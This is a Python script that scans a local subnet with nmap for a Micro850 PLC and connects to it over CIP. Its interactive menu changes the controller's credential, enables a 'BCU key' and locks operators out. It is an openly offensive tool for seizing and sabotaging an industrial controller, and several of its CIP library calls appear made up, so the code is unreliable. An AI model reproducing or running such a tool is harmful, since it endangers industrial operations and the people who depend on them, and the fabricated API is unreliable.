import subprocess
from scapy.all import *
import time
import threading
from pycomm import CIP

# Define the subnet to scan
subnet = '192.168.1.0/24'

def find_plc_ip(subnet):
    try:
        output = subprocess.check_output(['nmap', '-sP', subnet]).decode('utf-8')
        for line in output.split('\n'):
            if 'Micro850' in line:  
                ip_address = line.split(' ')[-1]
                return ip_address
    except Exception as e:
        print(f"Failed to find PLC IP: {e}")
        return None

def change_credential(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Identify the current credential
        current_credential = cip_client.get_credential()
        
        # Print the current credential
        print(f"Current Credential: {current_credential}")
        
        # Change the credential
        new_credential = input("Enter the new credential: ")
        cip_client.set_credential(new_credential)
        
        print("Credential changed successfully")
    except Exception as e:
        print(f"Failed to change credential: {e}")

def enable_bcu_key(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Enable the BCU key
        cip_client.enable_bcu_key()
        
        print("BCU key enabled successfully")
    except Exception as e:
        print(f"Failed to enable BCU key: {e}")

def lock_out_operators(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Lock out operators
        cip_client.lock_out_operators()
        
        print("Operators locked out successfully")
    except Exception as e:
        print(f"Failed to lock out operators: {e}")

def main():
    plc_ip = find_plc_ip(subnet)
    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        
        while True:
            print("1. Change Credential")
            print("2. Enable BCU Key")
            print("3. Lock Out Operators")
            print("4. Exit")
            choice = input("Enter your choice: ")
            
            if choice == "1":
                change_credential(plc_ip)
            elif choice == "2":
                enable_bcu_key(plc_ip)
            elif choice == "3":
                lock_out_operators(plc_ip)
            elif choice == "4":
                break
            else:
                print("Invalid choice. Please try again.")
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()